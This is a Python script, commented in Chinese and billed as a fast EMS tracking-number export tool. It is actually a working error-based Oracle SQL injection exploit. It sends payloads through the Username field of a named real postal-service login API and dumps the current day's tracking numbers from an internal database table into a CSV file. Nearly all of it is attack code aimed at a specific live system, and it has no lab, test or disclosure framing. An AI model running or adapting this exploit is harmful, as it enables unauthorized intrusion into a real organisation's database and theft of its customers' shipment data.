#!/usr/bin/env python3
"""
快速批量导出当天所有EMS运单号（优化版）
使用批量查询，大幅提升速度
"""

import requests
import json
import time
import csv

class FastTrackingExporter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def get_current_date(self):
        """获取数据库当前日期"""
        query = "SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL"
        return self.extract_via_error(query) or '20251011'
    
    def count_today_tracking(self, date):
        """统计数量"""
        query = f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'"
        result = self.extract_via_error(query)
        return int(result) if result else 0
    
    def export_batch(self, date, batch_size=100):
        """批量导出（每次提取多个）"""
        print(f"\n📥 开始批量导出...")
        
        tracking_numbers = []
        batch_num = 0
        
        # 分批提取，每批100个
        for start in range(1, 8000, batch_size):
            batch_num += 1
            end = start + batch_size - 1
            
            print(f"\r  批次 {batch_num}: 提取 {start}-{end}...", end='', flush=True)
            
            # 使用ROWNUM范围查询
            query = f"""
            SELECT ITEMCODE 
            FROM (
                SELECT ITEMCODE, ROWNUM AS RN 
                FROM (
                    SELECT DISTINCT ITEMCODE 
                    FROM EMS.JOURNEYTOKEN_ZNS 
                    WHERE TOKENDATE='{date}' 
                    AND ITEMCODE LIKE 'E%VN' 
                    ORDER BY ITEMCODE
                )
            ) 
            WHERE RN BETWEEN {start} AND {end}
            """
            
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                # 可能返回多个，用逗号分隔
                items = result.split(',') if ',' in result else [result]
                
                for item in items:
                    item = item.strip()
                    if item and len(item) > 5:
                        tracking_numbers.append(item)
            
            time.sleep(0.5)
            
            # 如果返回少于batch_size，说明已经到底了
            if result and len(result) < 100:
                break
        
        print(f"\n\n✅ 共提取 {len(tracking_numbers)} 个运单号")
        return tracking_numbers
    
    def export_samples(self, date, limit=500):
        """快速导出样本（前N个）"""
        print(f"\n📥 快速导出前 {limit} 个运单号...")
        
        tracking_numbers = []
        
        for i in range(1, limit + 1):
            if i % 50 == 0:
                print(f"\r  进度: {i}/{limit}", end='', flush=True)
            
            query = f"""
            SELECT ITEMCODE 
            FROM (
                SELECT DISTINCT ITEMCODE 
                FROM EMS.JOURNEYTOKEN_ZNS 
                WHERE TOKENDATE='{date}' 
                AND ITEMCODE LIKE 'E%VN' 
                ORDER BY ITEMCODE
            ) 
            WHERE ROWNUM={i}
            """
            
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                tracking_numbers.append(result)
            
            time.sleep(0.1)
        
        print(f"\n\n✅ 共提取 {len(tracking_numbers)} 个运单号")
        return tracking_numbers
    
    def save_to_csv(self, tracking_numbers, date):
        """保存到CSV"""
        if not tracking_numbers:
            return None
        
        filename = f'/workspace/ems_tracking_{date}.csv'
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['No', 'TrackingNumber', 'Date'])
            
            for i, tracking in enumerate(tracking_numbers, 1):
                writer.writerow([i, tracking, date])
        
        print(f"\n✅ 已保存到: {filename}")
        print(f"📊 总数: {len(tracking_numbers)} 个")
        
        print(f"\n前20个运单号:")
        for i, tracking in enumerate(tracking_numbers[:20], 1):
            print(f"  {i}. {tracking}")
        
        return filename
    
    def run(self, mode='sample', limit=500):
        """
        执行导出
        mode: 'sample' 只导出样本，'full' 导出全部
        limit: sample模式下导出的数量
        """
        print("=" * 80)
        print("📦 EMS运单号快速导出工具（优化版）")
        print("=" * 80)
        
        print("\n🔌 连接中...")
        if not self.inject("admin"):
            print("❌ 连接失败")
            return
        print("✅ 连接成功")
        
        # 获取日期
        current_date = self.get_current_date()
        print(f"\n📅 日期: {current_date}")
        
        # 统计
        total = self.count_today_tracking(current_date)
        print(f"📊 总数: {total} 个EMS运单号")
        
        if total == 0:
            print("❌ 没有数据")
            return
        
        # 导出
        if mode == 'sample':
            print(f"\n🎯 模式: 样本导出（前{limit}个）")
            print(f"⏱️  预计: {limit * 0.1 / 60:.1f} 分钟")
            tracking_numbers = self.export_samples(current_date, min(limit, total))
        else:
            print(f"\n🎯 模式: 完整导出（全部{total}个）")
            print(f"⏱️  预计: {total * 0.5 / 60:.1f} 分钟")
            tracking_numbers = self.export_batch(current_date)
        
        # 保存
        if tracking_numbers:
            self.save_to_csv(tracking_numbers, current_date)
        
        print("\n" + "=" * 80)
        print("✅ 完成！")
        print("=" * 80)

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║         EMS运单号快速导出工具 v2.0（优化版）                 ║
║                                                              ║
║  模式1: 样本导出（推荐）- 快速导出前500个                    ║
║  模式2: 完整导出 - 导出全部（需要较长时间）                  ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    exporter = FastTrackingExporter(target_url)
    
    # 默认导出前500个（大约1分钟）
    # 如需全部，改为 mode='full'
    exporter.run(mode='sample', limit=500)
